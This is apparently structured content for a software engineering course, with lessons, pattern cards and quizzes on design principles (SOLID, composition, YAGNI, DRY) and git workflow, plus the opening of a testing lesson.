lesson.text: A feature request arrives: add a new payment method. You discover that adding it requires editing the checkout controller, the invoice generator, the refund service and three tests, and that a typo in one breaks the others. The code works, but every change ripples. Design principles are heuristics for arranging code so that changes stay local.
Cohesion and coupling

**Cohesion** is how strongly the parts inside a module belong together; a module named `InvoiceCalculator` that only computes invoice totals is cohesive, while `Utils` holding date parsing, HTTP helpers and tax rules is not. **Coupling** is how much one module depends on the internals of another. The aim is high cohesion and low coupling: things that change together live together, and modules interact through small, stable interfaces. When a change in module A forces edits in B, C and D, coupling is high.
SOLID in practice

items: **Single Responsibility**: a module should have one reason to change. A class that formats reports and also talks to the database changes for two unrelated reasons.
**Open/Closed**: add behavior by adding new code rather than editing working code, typically via a shared interface.
**Liskov Substitution**: a subtype must be usable wherever its parent is expected without surprising the caller. A `Square` that breaks `Rectangle` width/height expectations violates it.
**Interface Segregation**: prefer small, focused interfaces so clients do not depend on methods they never use.
**Dependency Inversion**: high-level policy should depend on an abstraction, not on a concrete low-level detail such as a specific database.

lesson.text: These are not laws. They are prompts to ask: what changes independently here, and is it isolated? Applying them mechanically to a ten-line script produces ceremony with no payoff.

lesson.text: Composition over inheritance

Inheritance models an is-a relationship and binds the child tightly to its parent's internals; changing the parent can silently break every subclass. Composition models has-a: an object holds collaborators and delegates to them. A `Notifier` that is given an `EmailSender` and a `SmsSender` can swap or combine behavior at runtime, whereas a deep hierarchy such as `EmailSmsUrgentNotifier extends EmailNotifier` explodes combinatorially. Use inheritance sparingly, for true substitutable subtypes or to satisfy a framework contract.
YAGNI and the cost of speculation

YAGNI, you aren't gonna need it, says not to build for requirements you only imagine. Speculative flexibility has a real price: more code to read, test and keep consistent, and the guessed extension point usually does not match the real need. Add the abstraction when the second or third concrete case shows what actually varies.
DRY versus the wrong abstraction

DRY, don't repeat yourself, is about duplicated knowledge, not duplicated text. Two blocks that look alike but change for different reasons are only coincidentally similar; merging them couples unrelated features. The common failure is a shared function that grows parameters and flags to serve each new caller. The heuristic of waiting for three occurrences is rough, but the better test is: if one changes, must the other change too? If not, duplication is cheaper than a wrong abstraction.
Duplication is cheap to fix later; a wrong abstraction embedded in ten callers is expensive. When unsure, duplicate and wait.
Pitfalls

items: Interfaces with exactly one implementation, created 'just in case'.
God classes that know everything, and anemic wrappers that add nothing.
Treating SOLID as a checklist rather than a way to localize change.

lesson.text: Agents lean toward over-engineering when asked to be 'flexible' or 'clean': factories, abstract base classes and config options nobody requested. They also copy-paste near-duplicates across files instead of finding the shared knowledge. Constrain them: say 'smallest change that works, no new abstractions unless there are two real callers'. In review, ask for each new interface or class: what concrete requirement forced it, and what changes if I delete it?

patterns.signal: The same `switch (paymentType)` appears in checkout, invoicing and refunds, and each new type edits all of them
patterns.why: Put per-variant behavior behind one interface with an implementation per type, so a new type is new code, not edits in five places. Overkill for two stable cases; a plain `if` is fine there.

patterns.signal: A vendor SDK's types and quirks show up throughout your business code, and switching vendors means a rewrite
patterns.why: Wrap the SDK behind an interface shaped by your needs and translate in one class. You gain a swap point and a test seam; the cost is one more layer that must track SDK changes.

patterns.signal: Callers must create five subsystem objects and call them in the right order just to do one common task
patterns.why: Expose one simple entry point (`exportReport()`) that orchestrates the subsystem. Keep the underlying parts reachable for unusual cases, and stop the facade becoming a god class.

patterns.signal: After an order is placed, email, analytics and inventory must react, and the order code imports all three
patterns.why: The order code publishes `OrderPlaced` and listeners subscribe, so adding a reaction does not touch it. Control flow gets harder to trace and listener order should not matter; unsubscribe to avoid leaks.

patterns.signal: Users need undo/redo, or actions must be queued, logged, retried or replayed later
patterns.why: Represent each action as an object with `execute` (and `undo`), so history, queues and audit logs are just lists of commands. Too much ceremony for plain one-shot calls with no history.

patterns.signal: `new SmtpMailer()` or `new S3Store()` choices based on config are copy-pasted across many call sites
patterns.why: Centralize the decision of which concrete type to build, so callers depend only on the interface. One `if` in one place does not need a factory class; a function is often enough.

patterns.signal: A class constructs its own `DatabaseClient` internally, so tests cannot run it without a real database
patterns.why: Pass collaborators in through the constructor; the caller (or composition root) decides real vs fake. Plain constructor parameters usually suffice; a DI container adds magic and is optional.

patterns.signal: Subclasses multiply per combination: `EmailAlert`, `SmsAlert`, `EmailSmsRetryAlert`
patterns.why: An `Alert` holds a list of channels and an optional retry policy, so features combine at runtime without new classes. Inheritance still fits true, stable is-a hierarchies with small surface.

patterns.signal: A subclass overrides a method to throw `NotSupported` or breaks the parent's assumptions (the Square/Rectangle case)
patterns.why: If a subtype cannot honor the base contract, callers will break when given it. Model them as separate types or share behavior through composition instead of forcing an is-a relationship.

patterns.signal: An interface or abstract factory has exactly one implementation and no second one on the roadmap
patterns.why: Speculative indirection costs reading, testing and navigation today for a guessed future. Use the concrete class; extracting an interface later, when a second case is real, is cheap.

patterns.signal: Two blocks look identical but serve rules that change for different reasons (US tax vs EU tax)
patterns.why: DRY targets duplicated knowledge, not similar text. Merging coincidental twins couples unrelated rules; wait for a third real case that changes for the same reason before extracting.

patterns.signal: A shared helper grew flags and parameters for each caller and every change risks breaking someone
patterns.why: Copy the helper back into callers, delete the branches each one does not need, then re-extract what is genuinely shared. Duplication is cheaper than the wrong abstraction.

keyPoints: Aim for high cohesion within modules and low coupling between them.
SOLID principles are prompts for localizing change, not rigid rules.
Prefer composition (has-a) over inheritance (is-a) for flexibility.
YAGNI: avoid speculative generality until real cases appear.
DRY is about duplicated knowledge; a wrong abstraction costs more than duplication.

quiz.q: Two functions have identical code today, but one handles tax for the US and one for the EU, which change under different laws. What is the best move?
options: Merge them into one function that takes a region flag
Delete one copy and import the survivor in both places
Keep them separate, since they change for different reasons
Move both into a shared `Utils` class to group them
quiz.explain: They share text, not knowledge, and they change for different reasons, so merging couples unrelated rules. DRY targets duplicated knowledge, not coincidental similarity.

quiz.q: Which situation most clearly signals high coupling?
options: A class exposes only one public method to its callers
Changing a private field in A forces edits in B, C and D
Two modules live in the same repository and folder
A module has a long and highly descriptive name
quiz.explain: Coupling means depending on another module's internals; ripple edits are the symptom. Repository layout, naming and method count are unrelated.

quiz.q: You need an alert that sends email, SMS, or both, sometimes with a retry. Which approach scales best?
options: A subclass for every combination of channel and retry
One class with a boolean flag for each channel
Copy the sending code into each place that needs it
Compose a notifier from injected sender objects
quiz.explain: Composition lets you combine behaviors without a combinatorial class hierarchy. Flags and copies grow harder to maintain with each new channel.

quiz.q: A teammate adds an `AbstractPaymentStrategyFactory` for a product with one payment provider and no plans for others. This most violates:
options: YAGNI
Liskov Substitution
Interface Segregation
Single Responsibility
quiz.explain: It adds speculative flexibility with no concrete need. The other principles are not the primary issue here.

quiz.q: A `Square` subclass of `Rectangle` overrides `setWidth` to also set height, and code that sets width then height gets wrong areas. Which principle is broken?
options: Open/Closed
Dependency Inversion
Liskov Substitution
Interface Segregation
quiz.explain: The subtype cannot be used wherever the parent is expected without surprising callers, which is exactly what Liskov Substitution forbids.

quiz.q: `place_order()` saves the order and then calls the email sender, the analytics client and the inventory service directly. Every new reaction, like loyalty points, means editing it again. What should you reach for?
options: Wrap the three calls in one facade object called `OrderNotifier` that place_order uses
Subclass `OrderService` once per reaction that is needed
Publish an order-placed event and let each reaction subscribe to it
Add a boolean parameter per reaction to `place_order()`
quiz.explain: Events invert the dependency so order code no longer knows its reactions. A facade hides the calls but `place_order()` still depends on every reaction and still changes for each new one.

topics.title: Version control with git
topics.summary: Commits, branches, merge vs rebase, and how to undo mistakes without panic.

lesson.text: It is 5 p.m. and a change you made three days ago has broken checkout. Which of the 40 files you touched is the culprit? Without history you are guessing; with a clean history you can ask git to find the exact commit and revert it in a minute. Version control is a database of every state your project has been in, plus the reasoning for each change.
The model: snapshots, not diffs

A **commit** is an immutable snapshot of the whole project plus a message, an author and a pointer to its parent commit(s). A **branch** is just a movable label pointing at a commit; creating one is nearly free. `HEAD` is a pointer to where you currently are. Your work moves through three areas: the working directory (files on disk), the **staging area** (what will go into the next commit) and the repository (committed history). `git add` moves changes to staging; `git commit` records them.

git switch -c fix/rounding-bug    # new branch from current commit
git add -p                        # stage selected hunks interactively
git commit -m "Round invoice totals half-up, not half-even"
git log --oneline --graph -10     # see recent history
git diff --staged                 # review exactly what you are committing
Small, atomic commits

An atomic commit contains one logical change and leaves the project in a working state. Small commits make review easier, make `git bisect` effective at locating a regression (it binary-searches history, so each commit must build), and make a revert surgical. A commit that mixes a refactor, a bug fix and a formatting sweep cannot be reverted without losing the other two.
Good messages

A message has a short imperative subject (around 50 characters: 'Fix', 'Add', 'Remove') and, when needed, a body explaining why the change was made, not what, since the diff already shows that. Future you reading `git blame` wants the reason and the constraint. 'Fix stuff' and 'WIP' are useless; 'Retry webhook delivery on 409 to avoid duplicate charges' is gold.
Merge versus rebase

Both integrate work from one branch into another. **Merge** creates a new commit with two parents (unless git can simply fast-forward a branch that has not diverged), preserving the true history including when branches diverged. **Rebase** replays your commits on top of another base, producing a linear history by creating new commits with new hashes. Rebase makes history tidy; merge is safer because it never rewrites anything.

items: Rebase your own local, unpublished work onto the latest main to keep it current and linear.
Never rebase commits others have already pulled; rewriting shared history forces everyone to untangle duplicates.
Squash-merge on pull requests gives one commit per change; it trades granular history for readability of main.
Whichever strategy your team picks, use it consistently.

lesson.text: Recovering from mistakes

Git rarely loses committed work. The `reflog` records every place HEAD and your branches have been in your local clone (kept 90 days by default, 30 days for commits no longer reachable from any branch), so even a botched rebase or a deleted branch is recoverable.

git restore path/file.py        # discard uncommitted edits to a file
git restore --staged file.py    # unstage but keep edits
git commit --amend              # fix the last (unpushed) commit
git revert <sha>                # new commit that undoes <sha>; safe on shared branches
git reflog                      # find where HEAD used to be
git reset --hard <sha-from-reflog>  # jump back (discards uncommitted work!)
git bisect start; git bisect bad; git bisect good <sha>  # find the breaking commit
`git reset --hard` and `git checkout .` discard uncommitted changes, and edits that were never staged are gone permanently because git never stored them. Commit or stash first when unsure.
Pitfalls

items: Force-pushing to a shared branch (use `--force-with-lease` on your own branch only).
Committing secrets: removing the file in a later commit leaves it in history, so rotate the credential.
Long-lived branches that diverge for weeks and produce painful merges.
Committing generated files and large binaries instead of ignoring them.

lesson.text: Agents can run git commands for you, which makes history hygiene your job to specify. Ask for one logical change per commit with a why-focused message, and tell the agent never to force-push, amend published commits, or run `reset --hard` without asking. Review `git diff` and `git status` before accepting a commit: agents sometimes stage unrelated files, generated output or even `.env` files. Working on a branch (or worktree) per agent task keeps experiments disposable and your main safe.

patterns.signal: A regression appeared somewhere in the last 200 commits and you have a command that reproduces it
patterns.why: Binary search finds the culprit in about 8 steps, automated if a script returns pass/fail. Works only if commits build and are atomic; giant mixed commits leave you with a huge diff to search.

patterns.signal: A bad commit is already on shared `main` and teammates have pulled it
patterns.why: Revert adds a new commit that undoes the change, so nobody's history is rewritten. Resetting and force-pushing shared history forces everyone to untangle duplicates.

patterns.signal: After `git reset --hard` or a botched rebase, a committed but unpushed commit vanished from `git log`
patterns.why: The reflog records where HEAD has been, so you can branch or reset to the lost hash. It is local to your clone and expires (90 days by default); uncommitted work is not in it.

patterns.signal: Your local, unpublished feature branch is behind `main` and you want a linear, current history
patterns.why: `git rebase main` replays your commits on top so the PR diff is clean. Only for commits nobody else has; rebasing shared commits creates duplicates for everyone who pulled them.

patterns.signal: After rebasing your own branch the push is rejected and you reach for `--force`
patterns.why: It refuses to overwrite the remote if someone pushed commits you have not seen, while still updating your rewritten branch. Never force-push shared branches like `main`.

patterns.signal: One commit mixes a reformat of a file with a logic change, so the real change is buried in noise
patterns.why: Stage hunks selectively so formatting and behavior land in separate commits. Each commit then reviews, reverts and bisects on its own. Each one should still build.

patterns.signal: The PR history is a string of `wip`, `fix typo` and `oops` commits
patterns.why: Use `git commit --fixup` plus an autosquash rebase, or a squash-merge, to leave one meaningful commit per logical change. Squash-merge loses per-commit detail on large PRs.

patterns.signal: A commit message says `fix stuff` and six months later nobody knows why the line changed
patterns.why: Subject like `Fix rounding in refund totals` (about 50 chars), body explaining the reason, the trade-off and the ticket. The diff already shows what; only the message can record why.

patterns.signal: An urgent fix lands on `main` but also needs to go to an older release branch
patterns.why: Copies one commit onto another branch without merging everything else. The copy gets a new hash, so record the origin (`-x`), and expect conflicts if the branches diverged far.

patterns.signal: You are mid-feature with uncommitted changes when a hotfix on another branch comes in
patterns.why: A second working directory on another branch lets you fix and test without stashing or losing build state. Stash works for quick switches but is easy to forget and lose track of.

keyPoints: A commit is an immutable snapshot with a parent pointer; a branch is a movable label.
Small atomic commits make review, bisect and revert effective.
Messages should say why; use imperative subject lines.
Merge preserves history; rebase rewrites it, so never rebase shared commits.
The reflog and `git revert` let you recover from most mistakes.

quiz.q: You pushed a bad commit to a shared main branch that teammates have already pulled. What is the safest fix?
options: `git reset --hard HEAD~1`, then force-push main
Rebase main interactively to drop the bad commit
`git revert` the commit and push the new commit
Delete the remote repository and push a fresh one
quiz.explain: Revert adds a new commit that undoes the bad one without rewriting shared history. Resetting, rebasing and force-pushing break everyone who already pulled.

quiz.q: Why does `git bisect` work best with atomic commits that each build and pass?
options: Bisect can only step through commits under ten lines
Bisect requires every commit to be GPG-signed first
Bisect automatically deletes the commits that fail
Each commit it tests can be judged good or bad
quiz.explain: Bisect binary-searches history; if intermediate commits are broken for unrelated reasons, they cannot be classified and the search gives misleading results.

quiz.q: You ran `git reset --hard HEAD~1` and your last (committed, unpushed) commit vanished from `git log`. What helps?
options: Use `git reflog` to find the old HEAD and reset to it
Nothing; once gone from the log, the commit is lost
Re-clone the remote, which still has your commit
Run `git stash pop` to bring the commit back
quiz.explain: The commit object still exists and the reflog records where HEAD was. The remote never had the unpushed commit, and stash is unrelated. Uncommitted work, by contrast, would be unrecoverable.

quiz.q: Which is the best use of rebase?
options: Rebasing a branch teammates have checked out, to tidy it
Replaying your unpublished feature commits onto latest main
Rewriting main to remove an old commit everyone has pulled
Rebasing every shared branch by default, without discussion
quiz.explain: Rebasing local, unpublished work is safe. Rewriting commits that others have pulled creates divergent histories.

quiz.q: Which commit message is most useful six months later?
options: `fix bug in checkout flow`
`Update checkout.py and payment_gateway.py`
`Retry capture once on gateway timeout to avoid double charges`
`WIP: more changes to the payment and checkout stuff, see diff`
quiz.explain: It states the change and the reason, which the diff cannot show. The others carry little beyond what git already records.

quiz.q: You are mid-feature with a dev server running and half-finished edits. A production hotfix must be built and tested on the release branch right now, and you want your current state left exactly as it is. What fits best?
options: Run `git reset --hard` and redo the feature work afterwards
Check the release branch out in a second directory with `git worktree add`
Cherry-pick your unfinished edits onto the release branch and build from there
Rebase the feature branch onto the release branch first
quiz.explain: A worktree gives the hotfix its own checkout while your files and running server stay untouched. Cherry-pick moves commits between branches and does nothing about your dirty working tree.

topics.title: Testing
topics.summary: The test pyramid, TDD, test doubles and what separates a good test from a brittle one.

lesson.text: You refactor a pricing function and ship on a Friday. Monday brings complaints: discounts stack incorrectly. A test that took five minutes to write would have caught it. Automated tests are executable specifications that tell you, within seconds, whether a change broke existing behavior. They are what lets you change code confidently, and they are the main safety net when much of the code was generated.
The test pyramid

items: **Unit tests**: exercise one function or class in isolation. Fast (milliseconds), precise failures, many of them.
**Integration tests**: check that components work together, such as your code against a real database or a real HTTP boundary. Slower, fewer.
**End-to-end (e2e) tests**: drive the whole system through the UI or public API like a user. Slowest, most brittle, few of them, covering critical journeys only.

lesson.text: The pyramid is an economic argument: put most tests where they are cheap and give precise failures. An inverted pyramid, mostly slow e2e tests, gives slow feedback and failures that say 'something broke' without saying where. Modern variants (a 'trophy' emphasizing integration tests) shift the balance, but the principle holds: match the test level to the risk.

lesson.caption: Watch the feedback bars: a suite built mostly of unit tests reports quickly and precisely, while an inverted suite of mostly e2e tests makes you wait.
